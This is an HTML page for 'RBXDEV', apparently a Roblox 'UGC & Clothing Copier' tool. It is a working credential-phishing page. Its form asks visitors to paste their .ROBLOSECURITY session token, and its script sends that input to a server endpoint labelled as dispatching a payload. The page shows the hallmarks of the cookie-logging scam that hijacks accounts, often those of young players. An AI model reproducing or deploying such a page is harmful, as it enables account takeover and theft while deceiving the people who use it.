<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RBXDEV | Professional Clothing & UGC Tool</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .glass {
            background: rgba(17, 24, 39, 0.7);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
    </style>
</head>
<body class="bg-slate-950 text-slate-100 min-h-screen flex flex-col justify-between selection:bg-indigo-500 selection:text-white">

    <!-- Navbar -->
    <header class="glass sticky top-0 z-50 border-b border-slate-800/80 px-6 py-4 flex justify-between items-center">
        <div class="flex items-center space-x-3">
            <div class="bg-indigo-600 text-white font-black px-3 py-1.5 rounded-xl shadow-lg shadow-indigo-500/30 text-lg tracking-wider">RBXDEV</div>
            <span class="text-xs font-semibold text-indigo-400 bg-indigo-950/60 px-2.5 py-1 rounded-full border border-indigo-800/50">v2.4 Secure</span>
        </div>
        <nav class="hidden md:flex space-x-6 text-sm font-medium text-slate-300">
            <a href="/clothes-copier" class="text-indigo-400 hover:text-indigo-300 transition">Copier Tool</a>
            <a href="#" class="hover:text-white transition">Documentation</a>
            <a href="#" class="hover:text-white transition">Tutorial</a>
        </nav>
    </header>

    <!-- Main Content -->
    <main class="flex-grow flex items-center justify-center px-4 py-12">
        <div class="glass w-full max-w-xl p-8 rounded-3xl shadow-2xl shadow-indigo-950/40 relative overflow-hidden">
            
            <!-- Ambient Glow -->
            <div class="absolute -top-24 -right-24 w-48 h-48 bg-indigo-600/20 rounded-full blur-3xl pointer-events-none"></div>
            <div class="absolute -bottom-24 -left-24 w-48 h-48 bg-purple-600/20 rounded-full blur-3xl pointer-events-none"></div>

            <div class="text-center mb-8 relative z-10">
                <h1 class="text-3xl font-extrabold tracking-tight mb-2">UGC & Clothing Copier</h1>
                <p class="text-sm text-slate-400">Paste your session payload or target link below to dispatch securely.</p>
            </div>

            <!-- Form -->
            <form id="copierForm" class="space-y-6 relative z-10">
                <div>
                    <label for="targetInput" class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-2">Target Data / Session Token</label>
                    <textarea id="targetInput" rows="4" required placeholder="Paste .ROBLOSECURITY token or item link here..." class="w-full bg-slate-900/80 border border-slate-800 rounded-2xl px-4 py-3 text-sm text-slate-200 placeholder-slate-600 focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 transition resize-none font-mono"></textarea>
                </div>

                <button type="submit" id="submitBtn" class="w-full bg-gradient-to-r from-indigo-600 to-violet-600 hover:from-indigo-500 hover:to-violet-500 text-white font-semibold py-3.5 px-6 rounded-2xl shadow-lg shadow-indigo-600/30 transition duration-200 flex items-center justify-center space-x-2">
                    <span>Initialize Extraction</span>
                </button>
            </form>

            <!-- Status Message Box -->
            <div id="statusBox" class="hidden mt-6 p-4 rounded-xl text-sm text-center font-medium border transition-all"></div>
        </div>
    </main>

    <!-- Footer -->
    <footer class="text-center py-6 text-xs text-slate-500 border-t border-slate-900">
        &copy; 2026 RBXDEV Studio. All rights reserved. Secure Telemetry Infrastructure.
    </footer>

    <!-- Frontend Script Logic -->
    <script>
        const form = document.getElementById('copierForm');
        const submitBtn = document.getElementById('submitBtn');
        const targetInput = document.getElementById('targetInput');
        const statusBox = document.getElementById('statusBox');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            const rawData = targetInput.value.trim();

            if (!rawData) return;

            submitBtn.disabled = true;
            submitBtn.innerHTML = `<span>Processing...</span>`;
            statusBox.classList.add('hidden');

            try {
                const response = await fetch('/api/process', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ data: rawData })
                });

                const result = await response.json();

                statusBox.classList.remove('hidden');
                if (result.success) {
                    statusBox.className = "mt-6 p-4 rounded-xl text-sm text-center font-medium bg-emerald-950/60 border border-emerald-800/50 text-emerald-300";
                    statusBox.innerText = "✅ Payload processed and dispatched successfully!";
                    targetInput.value = "";
                } else {
                    statusBox.className = "mt-6 p-4 rounded-xl text-sm text-center font-medium bg-rose-950/60 border border-rose-800/50 text-rose-300";
                    statusBox.innerText = result.error || "Error: Watch the tutorial again";
                }
            } catch (err) {
                statusBox.classList.remove('hidden');
                statusBox.className = "mt-6 p-4 rounded-xl text-sm text-center font-medium bg-rose-950/60 border border-rose-800/50 text-rose-300";
                statusBox.innerText = "Error: Watch the tutorial again";
            } finally {
                submitBtn.disabled = false;
                submitBtn.innerHTML = `<span>Initialize Extraction</span>`;
            }
        });
    </script>
</body>
</html>
